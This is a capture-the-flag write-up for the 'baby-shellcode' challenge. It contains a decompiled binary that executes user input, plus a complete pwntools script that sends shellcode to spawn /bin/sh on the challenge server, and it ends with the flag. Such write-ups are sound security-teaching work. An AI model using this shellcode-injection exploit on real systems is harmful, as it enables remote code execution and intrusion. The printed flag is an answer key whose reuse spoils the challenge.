# baby-shellcode

## Description

This challenge is a test to see if you know how to write programs that machines can understand.

Oh, you know how to code?

Write some code into this program, and the program will run it for you.

What programming language, you ask? Well... I said it's the language that machines can understand.

Author: drec

nc 34.28.147.7 5000

## Approach

### Decompiled code
```
void processEntry entry(void)

{
  undefined auStack_400 [1024];
  
  syscall();
                    /* WARNING: Could not recover jumptable at 0x0040101b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)auStack_400)(0,auStack_400,0x400);
  return;
}
```

Looking at the decompiled code, it is basically taking the user input and then executing it using syscall. So we can pop a shell by crafting an assembly instruction to call `/bin/sh`. Thankfully pwntools already has a shell template ready for us.

## Exploit
```
#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './baby-shellcode'
elf = context.binary = ELF(exe, checksec=False)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.28.147.7', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    payload = flat(
        asm(shellcraft.sh())
    )
    
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```

## Flag
```
uoftctf{arbitrary_machine_code_execution}
```